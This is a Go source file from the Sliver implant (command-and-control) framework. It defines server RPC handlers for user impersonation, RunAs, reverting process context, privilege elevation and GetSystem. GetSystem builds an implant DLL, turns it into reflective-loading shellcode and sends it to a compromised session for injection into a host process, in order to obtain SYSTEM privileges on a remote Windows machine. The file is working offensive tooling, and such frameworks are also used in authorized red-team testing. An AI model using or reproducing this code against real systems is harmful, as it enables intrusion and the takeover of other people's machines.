package rpc

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"context"
	"time"

	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/bishopfox/sliver/server/core"
	"github.com/bishopfox/sliver/server/generate"

	"github.com/golang/protobuf/proto"
)

// Impersonate - Impersonate a remote user
func (rpc *Server) Impersonate(ctx context.Context, req *sliverpb.ImpersonateReq) (*sliverpb.Impersonate, error) {
	resp := &sliverpb.Impersonate{}
	err := rpc.GenericHandler(req, resp)
	if err != nil {
		return nil, err
	}
	return resp, nil
}

// RunAs - Run a remote process as a specific user
func (rpc *Server) RunAs(ctx context.Context, req *sliverpb.RunAsReq) (*sliverpb.RunAs, error) {
	resp := &sliverpb.RunAs{}
	err := rpc.GenericHandler(req, resp)
	if err != nil {
		return nil, err
	}
	return resp, nil
}

// RevToSelf - Revert process context to self
func (rpc *Server) RevToSelf(ctx context.Context, req *sliverpb.RevToSelfReq) (*sliverpb.RevToSelf, error) {
	resp := &sliverpb.RevToSelf{}
	err := rpc.GenericHandler(req, resp)
	if err != nil {
		return nil, err
	}
	return resp, nil
}

// GetSystem - Attempt to get 'NT AUTHORITY/SYSTEM' access on a remote Windows system
func (rpc *Server) GetSystem(ctx context.Context, req *clientpb.GetSystemReq) (*sliverpb.GetSystem, error) {
	session := core.Sessions.Get(req.Request.SessionID)
	if session == nil {
		return nil, ErrInvalidSessionID
	}

	config := generate.ImplantConfigFromProtobuf(req.Config)
	config.Format = clientpb.ImplantConfig_SHARED_LIB
	config.ObfuscateSymbols = false
	dllPath, err := generate.SliverSharedLibrary(config)
	if err != nil {
		return nil, err
	}
	shellcode, err := generate.ShellcodeRDI(dllPath, "", "")
	if err != nil {
		return nil, err
	}
	data, err := proto.Marshal(&sliverpb.InvokeGetSystemReq{
		Data:           shellcode,
		HostingProcess: req.HostingProcess,
		Request:        req.GetRequest(),
	})
	if err != nil {
		return nil, err
	}

	timeout := time.Duration(req.Request.Timeout)
	data, err = session.Request(sliverpb.MsgInvokeGetSystemReq, timeout, data)
	if err != nil {
		return nil, err
	}
	getSystem := &sliverpb.GetSystem{}
	err = proto.Unmarshal(data, getSystem)
	if err != nil {
		return nil, err
	}
	return getSystem, nil
}

// Elevate - Attempt to elevate remote privileges
func (rpc *Server) Elevate(ctx context.Context, req *sliverpb.ElevateReq) (*sliverpb.Elevate, error) {
	resp := &sliverpb.Elevate{}
	err := rpc.GenericHandler(req, resp)
	if err != nil {
		return nil, err
	}
	return resp, nil
}
